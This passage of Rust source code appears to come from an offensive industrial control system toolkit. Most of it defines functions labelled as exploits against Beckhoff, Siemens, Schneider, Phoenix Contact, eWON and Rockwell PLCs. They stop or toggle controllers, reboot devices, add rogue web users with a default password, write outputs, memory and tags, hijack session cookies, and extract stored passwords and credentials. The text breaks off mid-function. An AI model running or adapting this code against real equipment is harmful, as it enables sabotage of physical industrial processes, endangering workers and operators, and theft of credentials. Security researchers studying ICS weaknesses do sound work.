        "x" | "input" | "inputs" => Some(("X", SlmpDeviceKind::Bit)),
        "y" | "output" | "outputs" => Some(("Y", SlmpDeviceKind::Bit)),
        "b" | "link-relay" | "link-relays" => Some(("B", SlmpDeviceKind::Bit)),
        _ => None,
    }
}

pub fn quick_slmp_ranges() -> Vec<SlmpMapRange> {
    vec![
        SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, 50),
        SlmpMapRange::new("M", SlmpDeviceKind::Bit, 0, 128),
    ]
}

pub fn common_slmp_ranges() -> Vec<SlmpMapRange> {
    vec![
        SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, 1000),
        SlmpMapRange::new("W", SlmpDeviceKind::Word, 0, 512),
        SlmpMapRange::new("R", SlmpDeviceKind::Word, 0, 512),
        SlmpMapRange::new("M", SlmpDeviceKind::Bit, 0, 2048),
        SlmpMapRange::new("X", SlmpDeviceKind::Bit, 0, 512),
        SlmpMapRange::new("Y", SlmpDeviceKind::Bit, 0, 512),
        SlmpMapRange::new("B", SlmpDeviceKind::Bit, 0, 512),
    ]
}

pub fn all_slmp_ranges() -> Vec<SlmpMapRange> {
    vec![
        SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, SLMP_ADDRESS_SPACE),
        SlmpMapRange::new("W", SlmpDeviceKind::Word, 0, SLMP_ADDRESS_SPACE),
        SlmpMapRange::new("R", SlmpDeviceKind::Word, 0, SLMP_ADDRESS_SPACE),
        SlmpMapRange::new("M", SlmpDeviceKind::Bit, 0, SLMP_ADDRESS_SPACE),
        SlmpMapRange::new("X", SlmpDeviceKind::Bit, 0, SLMP_ADDRESS_SPACE),
        SlmpMapRange::new("Y", SlmpDeviceKind::Bit, 0, SLMP_ADDRESS_SPACE),
        SlmpMapRange::new("B", SlmpDeviceKind::Bit, 0, SLMP_ADDRESS_SPACE),
    ]
}

pub fn parse_slmp_map_input(input: &str) -> Result<Vec<SlmpMapRange>, String> {
    let spec = input.trim();
    if spec.is_empty() || spec.eq_ignore_ascii_case("quick") {
        return Ok(quick_slmp_ranges());
    }
    if spec.eq_ignore_ascii_case("common") {
        return Ok(common_slmp_ranges());
    }
    if spec.eq_ignore_ascii_case("all") {
        return Ok(all_slmp_ranges());
    }
    let mut ranges = Vec::new();
    for token in spec.split(',') {
        let token = token.trim();
        if token.is_empty() {
            return Err(format_slmp_map_usage());
        }
        let parts: Vec<_> = token.split(':').map(str::trim).collect();
        if parts.len() != 3 {
            return Err(format_slmp_map_usage());
        }
        let (device, kind) = parse_slmp_device(parts[0]).ok_or_else(|| {
            format!(
                "unknown SLMP device '{}'. {}",
                parts[0],
                format_slmp_map_usage()
            )
        })?;
        let start = parts[1].parse::<u32>().map_err(|_| {
            format!(
                "invalid start address '{}'. {}",
                parts[1],
                format_slmp_map_usage()
            )
        })?;
        let count = parts[2]
            .parse::<u32>()
            .map_err(|_| format!("invalid count '{}'. {}", parts[2], format_slmp_map_usage()))?;
        if start >= SLMP_ADDRESS_SPACE {
            return Err(format!(
                "start address {start} is outside 0..16777215. {}",
                format_slmp_map_usage()
            ));
        }
        if count == 0 || count > SLMP_ADDRESS_SPACE - start {
            return Err(format!(
                "count {count} at start {start} is outside the SLMP address space. {}",
                format_slmp_map_usage()
            ));
        }
        ranges.push(SlmpMapRange::new(device, kind, start, count));
    }
    if ranges.is_empty() {
        Err(format_slmp_map_usage())
    } else {
        Ok(ranges)
    }
}

pub fn format_slmp_map_usage() -> String {
    "use quick, common, all, or device:start:count entries like d:0:100,m:0:128,w:0:64".to_string()
}

pub fn slmp_map_chunks(range: SlmpMapRange) -> Vec<(u32, u16)> {
    let mut chunks = Vec::new();
    let mut start = range.start;
    let mut remaining = range.count;
    let max_count = u32::from(range.chunk_limit());
    while remaining > 0 {
        let count = remaining.min(max_count);
        chunks.push((start, u16::try_from(count).unwrap_or(u16::MAX)));
        start += count;
        remaining -= count;
    }
    chunks
}

// ─── Beckhoff exploits ────────────────────────────────────────────────────────

pub fn exploit_beckhoff_info(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    out(&format!("[*] Discovering Beckhoff at {ip}..."));
    match scan::discover_ip_with_port(ip, 3, true, port)
        .ok()
        .and_then(|mut v| {
            if v.is_empty() {
                None
            } else {
                Some(v.remove(0))
            }
        }) {
        Some(dev) => {
            let state = scan::get_state(&dev, &local_netid, port);
            out(&format!("  State:   {state}"));
            match scan::get_device_info_full(&dev, &local_netid, port) {
                Some(info) => {
                    out(&format!("  Name:    {}", info.name));
                    out(&format!("  NetID:   {}", info.netid));
                    out(&format!("  TwinCAT: {}", info.tc_version));
                    if let Some(os) = &info.os_name {
                        out(&format!("  OS:      {os}"));
                    }
                }
                None => out("[-] Could not retrieve full device info"),
            }
        }
        None => out("[-] No Beckhoff device responded"),
    }
}

pub fn exploit_beckhoff_state(ip: &str, port: u16, state: &str, out: &dyn Fn(&str)) {
    use casket::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    out(&format!("[*] Setting TwinCAT state to {state} on {ip}..."));
    match scan::discover_ip_with_port(ip, 3, true, port)
        .ok()
        .and_then(|mut v| {
            if v.is_empty() {
                None
            } else {
                Some(v.remove(0))
            }
        }) {
        Some(dev) => match scan::set_twincat_state(&dev, &local_netid, state, port) {
            Ok(_) => out(&format!("[+] State command sent ({state})")),
            Err(e) => out(&format!("[-] {e}")),
        },
        None => out("[-] No Beckhoff device responded"),
    }
}

pub fn exploit_beckhoff_reboot(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::beckhoff::webcontrol;
    out(&format!("[*] Sending reboot to {ip}..."));
    match webcontrol::reboot(ip, port) {
        Ok(true) => out("[+] Reboot command sent"),
        Ok(false) => out("[!] Sent: no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_beckhoff_adduser(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::beckhoff::webcontrol;
    let (uname, pass) = input.split_once(':').unwrap_or((input, "Sc4d4v3r!"));
    out(&format!("[*] Adding user '{uname}' to {ip}..."));
    match webcontrol::add_user(ip, port, uname, pass) {
        Ok(true) => out("[+] User creation command sent"),
        Ok(false) => out("[!] Sent: no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_beckhoff_get_state(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    out(&format!("[*] Reading TwinCAT runtime state from {ip}..."));
    match scan::discover_ip_with_port(ip, 3, true, port)
        .ok()
        .and_then(|mut v| {
            if v.is_empty() {
                None
            } else {
                Some(v.remove(0))
            }
        }) {
        Some(dev) => out(&format!(
            "[+] State: {}",
            scan::get_state(&dev, &local_netid, port)
        )),
        None => out("[-] No Beckhoff device responded"),
    }
}

pub fn exploit_beckhoff_write_symbol(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    let (sym_name, hex_val) = input.split_once('=').unwrap_or((input, "00"));
    let value_bytes: Vec<u8> = hex_val
        .as_bytes()
        .chunks(2)
        .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
        .collect();
    if value_bytes.is_empty() {
        out("[-] No valid hex bytes (format: SymbolName=hexvalue)");
        return;
    }
    out(&format!("[*] Discovering {ip} for ADS write..."));
    let Some(dev) = scan::discover_ip_with_port(ip, 3, true, port)
        .ok()
        .and_then(|mut v| {
            if v.is_empty() {
                None
            } else {
                Some(v.remove(0))
            }
        })
    else {
        out("[-] No Beckhoff device responded");
        return;
    };
    out(&format!(
        "[*] Writing symbol '{sym_name}' ({} bytes)...",
        value_bytes.len()
    ));
    match scan::write_symbol_value(&dev, &local_netid, sym_name, value_bytes, port) {
        Ok(true) => out("[+] Symbol written"),
        Ok(false) => out("[!] Write sent: ADS error code returned"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Siemens exploits ─────────────────────────────────────────────────────────

pub fn exploit_siemens_cpu(
    ip: &str,
    port: u16,
    input: &str,
    stored_password: Option<&str>,
    out: &dyn Fn(&str),
) {
    use casket::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    let password: Option<&str> = if input.trim().is_empty() {
        stored_password
    } else {
        Some(input.trim())
    };
    out(&format!("[*] Reading CPU state from {ip}:{port}..."));
    let state = s7comm::get_cpu_state(ip, port, 5, password);
    if state == "Unknown" {
        if s7comm::probe_auth_required(ip, port, 5) {
            out("[-] Access denied: enter password in the exploit prompt or store in device fields[\"password\"]");
        } else {
            out("[-] Could not read CPU state");
        }
    } else {
        out(&format!("  CPU State: {state}"));
    }
}

pub fn exploit_siemens_io(
    ip: &str,
    port: u16,
    input: &str,
    stored_password: Option<&str>,
    out: &dyn Fn(&str),
) {
    use casket::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    let password: Option<&str> = if input.trim().is_empty() {
        stored_password
    } else {
        Some(input.trim())
    };
    out(&format!("[*] Reading I/O from {ip}:{port}..."));
    let data = s7comm::read_all_data(ip, port, 5, password);
    let [hdr, sep] = io_header();
    let mut has_any = false;
    for (area, prefix) in &[("inputs", "I"), ("outputs", "Q"), ("merkers", "M")] {
        let Some(Some(bits)) = data.get(*area) else {
            continue;
        };
        let mut keys: Vec<&String> = bits.keys().collect();
        keys.sort_by(|a, b| {
            let parse = |s: &str| {
                let (byte_s, bit_s) = s.split_once('.').unwrap_or((s, "0"));
                (
                    byte_s.parse::<u32>().unwrap_or(0),
                    bit_s.parse::<u8>().unwrap_or(0),
                )
            };
            parse(a).cmp(&parse(b))
        });
        out(&format!("  [{area}]"));
        out(&hdr);
        out(&sep);
        for key in &keys {
            let val = bits[*key];
            let (byte_s, bit_s) = key.split_once('.').unwrap_or((key, "0"));
            let addr = format!("{prefix}{byte_s}.{bit_s}");
            out(&fmt_io_row(&addr, bit_s, val));
        }
        out(&sep);
        has_any = true;
    }
    if !has_any {
        if s7comm::probe_auth_required(ip, port, 5) {
            out("[-] Access denied: enter password in the exploit prompt or store in device fields[\"password\"]");
        } else {
            out("[-] No I/O data received");
        }
    }
}

pub fn exploit_siemens_toggle(
    ip: &str,
    port: u16,
    input: &str,
    stored_password: Option<&str>,
    out: &dyn Fn(&str),
) {
    use casket::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    let password: Option<&str> = if input.trim().is_empty() {
        stored_password
    } else {
        Some(input.trim())
    };
    out(&format!("[*] Toggling CPU state on {ip}:{port}..."));
    if s7comm::change_cpu_state(ip, port, 5, password) {
        out(&format!(
            "[+] New state: {}",
            s7comm::get_cpu_state(ip, port, 5, password)
        ));
    } else if s7comm::probe_auth_required(ip, port, 5) {
        out("[-] Access denied: enter password in the exploit prompt or store in device fields[\"password\"]");
    } else {
        out("[-] Failed to toggle CPU state");
    }
}

pub fn exploit_siemens_set_outputs(
    ip: &str,
    port: u16,
    input: &str,
    stored_password: Option<&str>,
    out: &dyn Fn(&str),
) {
    use casket::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    let args = input.trim();
    out(&format!("[*] Writing outputs '{args}' to {ip}:{port}..."));
    if s7comm::set_outputs(ip, args, port, 5, stored_password) {
        out("[+] Outputs written");
    } else if s7comm::probe_auth_required(ip, port, 5) {
        out("[-] Access denied: store password in device fields[\"password\"] to authenticate");
    } else {
        out("[-] Write failed");
    }
}

pub fn exploit_siemens_set_merkers(
    ip: &str,
    port: u16,
    input: &str,
    stored_password: Option<&str>,
    out: &dyn Fn(&str),
) {
    use casket::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    let args = input.trim();
    let (bits, offset_s) = args.split_once(':').unwrap_or((args, "0"));
    let offset = offset_s.trim().parse::<u32>().unwrap_or(0);
    out(&format!(
        "[*] Writing merkers '{bits}' at offset {offset} to {ip}:{port}..."
    ));
    if s7comm::set_merkers(ip, bits, offset, port, 5, stored_password) {
        out("[+] Merkers written");
    } else if s7comm::probe_auth_required(ip, port, 5) {
        out("[-] Access denied: store password in device fields[\"password\"] to authenticate");
    } else {
        out("[-] Write failed");
    }
}

pub fn exploit_siemens_list_dbs(
    ip: &str,
    port: u16,
    input: &str,
    stored_password: Option<&str>,
    out: &dyn Fn(&str),
) {
    use casket::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    let password: Option<&str> = if input.trim().is_empty() {
        stored_password
    } else {
        Some(input.trim())
    };
    out(&format!(
        "[*] Scanning DB1..200 on {ip}:{port} (may take a moment)..."
    ));
    let blocks = s7comm::list_data_blocks(ip, port, 5, password);
    if blocks.is_empty() {
        if s7comm::probe_auth_required(ip, port, 5) {
            out("[-] Access denied: enter password in the exploit prompt or store in device fields[\"password\"]");
        } else {
            out("[-] No readable data blocks found");
        }
        return;
    }
    out(&format!("  {:<8}  {}", "Block", "Bytes read"));
    out(&format!("  {:─<8}  {:─<10}", "", ""));
    for (db_num, size) in &blocks {
        out(&format!("  {:<8}  {size}", format!("DB{db_num}")));
    }
    out(&format!("[+] {} data block(s) found", blocks.len()));
}

pub fn exploit_siemens_read_db(
    ip: &str,
    port: u16,
    input: &str,
    stored_password: Option<&str>,
    out: &dyn Fn(&str),
) {
    use casket::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    let parts: Vec<&str> = input.trim().splitn(3, ':').collect();
    let db_str = parts.first().copied().unwrap_or("DB1");
    let db_num = db_str
        .trim_start_matches(|c: char| c.is_alphabetic())
        .parse::<u16>()
        .unwrap_or(1);
    let offset = parts
        .get(1)
        .and_then(|s| s.parse::<u16>().ok())
        .unwrap_or(0);
    let length = parts
        .get(2)
        .and_then(|s| s.parse::<u16>().ok())
        .unwrap_or(64)
        .min(240);
    out(&format!(
        "[*] Reading DB{db_num} offset={offset} len={length} from {ip}:{port}..."
    ));
    match s7comm::read_data_block(ip, db_num, offset, length, port, 5, stored_password) {
        Ok(data) => {
            for line in hex_dump_lines(&data, offset) {
                out(&line);
            }
            out(&format!("[+] {} bytes", data.len()));
        }
        Err(e) => {
            if s7comm::probe_auth_required(ip, port, 5) {
                out("[-] Access denied: store password in device fields[\"password\"] to authenticate");
            } else {
                out(&format!("[-] {e}"));
            }
        }
    }
}

pub fn exploit_siemens_write_db(
    ip: &str,
    port: u16,
    input: &str,
    stored_password: Option<&str>,
    out: &dyn Fn(&str),
) {
    use casket::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    let parts: Vec<&str> = input.trim().splitn(3, ':').collect();
    let db_str = parts.first().copied().unwrap_or("DB1");
    let db_num = db_str
        .trim_start_matches(|c: char| c.is_alphabetic())
        .parse::<u16>()
        .unwrap_or(1);
    let offset = parts
        .get(1)
        .and_then(|s| s.parse::<u16>().ok())
        .unwrap_or(0);
    let hex_data = parts.get(2).copied().unwrap_or("");
    let data: Vec<u8> = hex_data
        .as_bytes()
        .chunks(2)
        .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
        .collect();
    if data.is_empty() {
        out("[-] No data to write (format: DB1:offset:hexbytes)");
        return;
    }
    out(&format!(
        "[*] Writing {} byte(s) to DB{db_num}:{offset} on {ip}:{port}...",
        data.len()
    ));
    match s7comm::write_data_block(ip, db_num, offset, &data, port, 5, stored_password) {
        Ok(true) => out("[+] DB write acknowledged"),
        Ok(false) => out("[!] Write sent: PLC did not acknowledge"),
        Err(e) => {
            if s7comm::probe_auth_required(ip, port, 5) {
                out("[-] Access denied: store password in device fields[\"password\"] to authenticate");
            } else {
                out(&format!("[-] {e}"));
            }
        }
    }
}

// ─── Schneider exploits ───────────────────────────────────────────────────────

pub fn exploit_schneider_flash(ip: &str, out: &dyn Fn(&str)) {
    use casket::vendors::schneider::flash_led;
    out(&format!("[*] Flashing LED on {ip}..."));
    match flash_led::flash_led_ip(ip) {
        Ok(()) => out("[+] Flash LED command sent"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_schneider_hijack_info(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::schneider::session_hijack;
    let username = if input.trim().is_empty() {
        "Administrator"
    } else {
        input.trim()
    };
    out(&format!("[*] Getting session cookie from {ip}..."));
    match session_hijack::get_session_cookie(ip, port) {
        Some(s) => {
            out(&format!("[+] Cookie:          {}", s.cookie_value));
            out(&format!("    Power-on count:  {}", s.power_on_count));
            if let Some(info) = session_hijack::get_device_info(ip, port, &s.cookie_value, username)
            {
                out(&format!("    Device:          {}", info.device));
                out(&format!("    MAC:             {}", info.mac));
                out(&format!("    Firmware:        {}", info.firmware));
                out(&format!("    State:           {}", info.state));
            }
        }
        None => out("[-] Failed to get session cookie"),
    }
}

pub fn exploit_schneider_action(
    ip: &str,
    port: u16,
    action: &str,
    input: &str,
    out: &dyn Fn(&str),
) {
    use casket::vendors::schneider::session_hijack;
    let username = if input.trim().is_empty() {
        "Administrator"
    } else {
        input.trim()
    };
    out(&format!("[*] Getting session cookie from {ip}..."));
    match session_hijack::get_session_cookie(ip, port) {
        Some(s) => {
            out(&format!("[+] Cookie: {}", s.cookie_value));
            if session_hijack::control_plc(ip, port, &s.cookie_value, username, action) {
                out(&format!("[+] PLC {action} command sent"));
            } else {
                out(&format!("[-] Failed to {action} PLC"));
            }
        }
        None => out("[-] Failed to get session cookie"),
    }
}

// ─── Phoenix exploits ─────────────────────────────────────────────────────────

pub fn exploit_phoenix_passwords(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::phoenix::webvisit;
    out(&format!("[*] Retrieving passwords from {ip}..."));
    match webvisit::retrieve_passwords(ip, port) {
        Ok(entries) => {
            for e in &entries {
                if let Some(p) = &e.password {
                    out(&format!("  Level {}: {p}", e.user_level));
                    out(&format!("[CRED] level{}:{p}", e.user_level));
                } else if let Some(h) = &e.hash {
                    out(&format!("  Level {} [sha256]: {h}", e.user_level));
                }
            }
            out(&format!("[+] {} entry/entries found", entries.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_phoenix_list_tags(ip: &str, port: u16, out: &dyn Fn(&str)) -> Vec<String> {
    use casket::vendors::phoenix::webvisit;
    out(&format!("[*] Listing tags on {ip}..."));
    match webvisit::get_tags(ip, port) {
        Ok((project, tags)) => {
            out(&format!("  Project: {project}"));
            for (i, t) in tags.iter().enumerate() {
                out(&format!("  [{i:>4}] {t}"));
            }
            out(&format!("[+] {} tag(s)", tags.len()));
            tags
        }
        Err(e) => {
            out(&format!("[-] {e}"));
            vec![]
        }
    }
}

pub fn exploit_phoenix_read_tags(ip: &str, port: u16, out: &dyn Fn(&str)) -> Vec<String> {
    use casket::vendors::phoenix::webvisit;
    out(&format!("[*] Reading tag values from {ip}..."));
    match webvisit::get_tags(ip, port) {
        Ok((_, tags)) => {
            match webvisit::read_tag_values(ip, port, &tags) {
                Ok(vals) => {
                    for (name, val) in &vals {
                        out(&format!("  {name}: {val}"));
                    }
                }
                Err(e) => out(&format!("[-] {e}")),
            }
            tags
        }
        Err(e) => {
            out(&format!("[-] {e}"));
            vec![]
        }
    }
}

pub fn exploit_phoenix_write_tag(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::phoenix::webvisit;
    let (tag_name, value) = input.split_once('=').unwrap_or((input, "0"));
    out(&format!("[*] Writing {tag_name}={value} on {ip}..."));
    match webvisit::write_tag_value(ip, port, tag_name, value) {
        Ok(_) => out(&format!("[+] Wrote {tag_name} = {value}")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_phoenix_info(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::phoenix::control;
    out(&format!("[*] Getting device info from {ip}..."));
    match control::get_device_info(ip, port, false) {
        Ok(info) => {
            out(&format!("  PLC Type: {}", info.plc_type));
            if let Some(fw) = info.firmware {
                out(&format!("  Firmware: {fw}"));
            }
            if let Some(b) = info.build {
                out(&format!("  Build:    {b}"));
            }
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_phoenix_control_ilc150(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::phoenix::control;
    let (action, start_type) = input.split_once(':').unwrap_or((input, "cold"));
    out(&format!("[*] Sending ILC150 '{action}' command to {ip}..."));
    match control::control_ilc150(ip, port, action, start_type) {
        Ok(state) => out(&format!("[+] PLC state: {state}")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_phoenix_control_ilc390(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::phoenix::control;
    out(&format!("[*] Sending ILC390 '{input}' command to {ip}..."));
    match control::control_ilc390(ip, port, input) {
        Ok(state) => out(&format!("[+] PLC state: {state}")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── eWON exploits ────────────────────────────────────────────────────────────

pub fn exploit_ewon_creds(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::ewon::exploit;
    let (username, max_str) = if input.is_empty() {
        ("adm", "20")
    } else {
        input.split_once(':').unwrap_or(("adm", "20"))
    };
    let max_users: u32 = max_str.trim().parse().unwrap_or(20);
    out(&format!(
        "[*] Extracting credentials from {ip} (user={username}, slots={max_users})..."
    ));
    let users = exploit::exploit(ip, port, username, max_users);
    for u in &users {
        out(&format!(
            "  {} ({} {}): {}",
            u.username, u.first_name, u.last_name, u.password
        ));
        if !u.access_rights.is_empty() {
            out(&format!("    Access: {}", u.access_rights));
        }
        out(&format!("[CRED] {}:{}", u.username, u.password));
    }
    out(&format!("[+] {} user(s) extracted", users.len()));
}

pub fn exploit_ewon_tags(ip: &str, port: u16, out: &dyn Fn(&str)) -> Vec<(String, bool)> {
    out(&format!("Reading tags from eWON at {ip}…"));
    match casket::vendors::ewon::scan::read_tag_values(ip, port, None) {
        Ok(tags) => {
            let leaves: Vec<(String, bool)> =
                tags.iter().map(|(n, _)| (n.clone(), false)).collect();
            for (name, val) in &tags {
                out(&format!("  {name}: {val}"));
            }
            out(&format!("{} tag(s).", tags.len()));
            leaves
        }
        Err(e) => {
            out(&format!("Error: {e}"));
            vec![]
        }
    }
}

// ─── Rockwell exploits ────────────────────────────────────────────────────────

pub fn exploit_rockwell_identity(ip: &str, port: u16, out: &dyn Fn(&str)) {
    use casket::vendors::rockwell::driver;
    out(&format!("[*] Getting device identity from {ip}..."));
    match driver::get_device_info(ip, port) {
        Ok(dev) => {
            out(&format!("  Vendor:       {}", dev.vendor));
            out(&format!("  Product Type: {}", dev.product_type));
            out(&format!("  Product Code: {}", dev.product_code));
            out(&format!("  Product Name: {}", dev.product_name));
            out(&format!("  Revision:     {}", dev.revision));
            out(&format!("  Serial:       {}", dev.serial));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

#[allow(clippy::too_many_lines)]
pub fn exploit_rockwell_tags(ip: &str, port: u16, out: &dyn Fn(&str)) -> Vec<(String, bool)> {
    use casket::vendors::rockwell::driver;
    use std::collections::HashMap;

    let mut leaves_out: Vec<(String, bool)> = Vec::new();
    out(&format!("[*] Enumerating tags on {ip}..."));
    let tags = match driver::enumerate_tags(ip, port) {
        Ok(t) => t,
        Err(e) => {
            out(&format!("[-] {e}"));
            return leaves_out;
        }
    };
    out(&format!(
        "[*] {} tags found: downloading UDT templates and reading values...",
        tags.len()
    ));

    let templates = driver::enumerate_templates(ip, port, &tags);

    let scalar_names: Vec<&str> = tags
        .iter()
        .filter(|t| !driver::is_struct_like(t.tag_type) && t.dimensions == 0)
        .map(|t| t.name.as_str())
        .collect();
    let raw_values = driver::read_tags_bulk(ip, port, &scalar_names);
    let value_map: HashMap<&str, String> = scalar_names
        .iter()
        .zip(raw_values.iter())
        .map(|(&name, opt)| {
            let val = match opt {
                Some(data) => driver::decode_value(
                    tags.iter()
                        .find(|t| t.name == name)
                        .map_or(0, |t| t.tag_type),
                    data,
                    Some(&templates),
                ),
                None => "-".to_string(),
            };
            (name, val)
        })
        .collect();

    let array1d_tags: Vec<(&str, u16)> = tags
        .iter()
        .filter(|t| !driver::is_struct_like(t.tag_type) && t.dimensions == 1)
        .map(|t| (t.name.as_str(), t.tag_type))
        .collect();
    let array1d_subscript_names: Vec<String> = array1d_tags
        .iter()
        .map(|(name, _)| format!("{name}[0]"))
        .collect();
    let array1d_name_refs: Vec<&str> = array1d_subscript_names.iter().map(String::as_str).collect();
    let array1d_raw = driver::read_tags_bulk(ip, port, &array1d_name_refs);
    let array1d_map: HashMap<&str, String> = array1d_tags
        .iter()
        .zip(array1d_raw.iter())
        .map(|((name, tag_type), opt)| {
            let val = match opt {
                Some(data) => format!(
                    "[{}, ...]",
                    driver::decode_value(*tag_type, data, Some(&templates))
                ),
                None => "[array]".to_string(),
            };
            (*name, val)
        })
        .collect();

    let array1d_struct_tags: Vec<(&str, u16)> = tags
        .iter()
        .filter(|t| driver::is_struct_like(t.tag_type) && t.dimensions == 1)
        .map(|t| (t.name.as_str(), t.tag_type))
        .collect();
    let array1d_struct_subs: Vec<String> = array1d_struct_tags
        .iter()
        .map(|(name, _)| format!("{name}[0]"))
        .collect();
    let array1d_struct_refs: Vec<&str> = array1d_struct_subs.iter().map(String::as_str).collect();
    let array1d_struct_raw = driver::read_tags_bulk(ip, port, &array1d_struct_refs);
    let array1d_struct_map: HashMap<&str, String> = array1d_struct_tags
        .iter()
        .zip(array1d_struct_raw.iter())
        .map(|((name, tag_type), opt)| {
            let val = opt.as_deref().map_or_else(
                || "[array]".to_string(),
                |data| {
                    format!(
                        "[{}, ...]",
                        driver::decode_value(*tag_type, data, Some(&templates))
                    )
                },
            );
            (*name, val)
        })
        .collect();

    let struct_tags: Vec<(&str, u16)> = tags
        .iter()
        .filter(|t| driver::is_struct_like(t.tag_type) && t.dimensions == 0)
        .map(|t| (t.name.as_str(), t.tag_type))
        .collect();
    let struct_names: Vec<&str> = struct_tags.iter().map(|(n, _)| *n).collect();
    let struct_raw = driver::read_tags_bulk(ip, port, &struct_names);
    let struct_raw_map: HashMap<&str, Vec<u8>> = struct_tags
        .iter()
        .zip(struct_raw.iter())
        .filter_map(|((name, _), opt)| opt.as_ref().map(|data| (*name, data.clone())))
        .collect();

    let [hdr, sep] = tag_header();
    out(&hdr);
    out(&sep);
    for t in &tags {
        let (base, dims) = driver::type_parts(t.tag_type);
        if driver::is_struct_like(t.tag_type) && t.dimensions == 0 {
            let template_id = t.tag_type & 0x0FFF;
            if let Some(raw) = struct_raw_map.get(t.name.as_str()) {
                let body = driver::struct_body(raw);
                let leaves = driver::flatten_struct(body, template_id, Some(&templates));
                if leaves.is_empty() {
                    out(&fmt_tag_row(
                        i64::from(t.instance_id),
                        &t.name,
                        &base,
                        dims,
                        &driver::type_name(t.tag_type),
                        i64::from(t.tag_type),
                    ));
                } else {
                    out(&fmt_tag_row(
                        i64::from(t.instance_id),
                        &t.name,
                        &base,
                        dims,
                        "",
                        i64::from(t.tag_type),
                    ));
                    let pad = leaves.iter().map(|l| l.path.len() + 1).max().unwrap_or(10);
                    for leaf in &leaves {
                        out(&fmt_leaf_row(&format!(".{}", leaf.path), &leaf.value, pad));
                        leaves_out.push((format!("{}.{}", t.name, leaf.path), leaf.writable));
                    }
                }
            } else {
                out(&fmt_tag_row(
                    i64::from(t.instance_id),
                    &t.name,
                    &base,
                    dims,
                    &driver::type_name(t.tag_type),
                    i64::from(t.tag_type),
                ));
            }
        } else if driver::is_struct_like(t.tag_type) && t.dimensions >= 1 {
            let value = array1d_struct_map
                .get(t.name.as_str())
                .cloned()
                .unwrap_or_else(|| format!("[{}D array]", t.dimensions));
            out(&fmt_tag_row(
                i64::from(t.instance_id),
                &t.name,
                &base,
                dims,
                &value,
                i64::from(t.tag_type),
            ));
        } else {
            let value = match t.dimensions {
                1 => array1d_map
                    .get(t.name.as_str())
                    .cloned()
                    .unwrap_or_else(|| "[array]".to_string()),
                2.. => format!("[{}D array]", t.dimensions),
                _ => value_map
                    .get(t.name.as_str())
                    .cloned()
                    .unwrap_or_else(|| "-".to_string()),
            };
            out(&fmt_tag_row(
                i64::from(t.instance_id),
                &t.name,
                &base,
                dims,
                &value,
                i64::from(t.tag_type),
            ));
            if t.dimensions == 0 && driver::is_writable_type(t.tag_type) {
                leaves_out.push((t.name.clone(), true));
            }
        }
    }
    out(&sep);
    out(&format!("[+] {} tag(s)", tags.len()));
    leaves_out
}

pub fn exploit_rockwell_read(ip: &str, port: u16, tag: &str, out: &dyn Fn(&str)) {
    use casket::vendors::rockwell::driver;
    out(&format!("[*] Reading tag '{tag}' from {ip}..."));
    match driver::read_tag(ip, port, tag) {
        Ok(raw) => out(&format!("  {tag} = 0x{}", hex_fmt(&raw))),
        Err(e) => out(&format!("[-] {e}")),
    }
}

pub fn exploit_rockwell_write(ip: &str, port: u16, input: &str, out: &dyn Fn(&str)) {
    use casket::vendors::rockwell::driver;
    let (tag_name, raw_val) = input.split_once('=').unwrap_or((input, "00"));
    let hex_val = raw_val
        .trim()
        .trim_start_matches("0x")
        .trim_start_matches("0X");
    let value_bytes: Vec<u8> = hex_val
        .as_bytes()
        .chunks(2)
        .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
        .collect();
    if value_bytes.is_empty() {
        out(&format!(
            "[-] {tag_name}: \"{raw_val}\" could not be parsed — use hex digits, e.g. 01 or 0x01"
        ));
        return;
    }
    let type_code: u16 = if value_bytes.len() == 1 {
        0x00C1
    } else {
        0x00C4
    };
    match driver::write_tag(ip, port, tag_name, type_code, &value_bytes) {
        Ok(()) => out(&format!("[+] {tag_name}: written")),
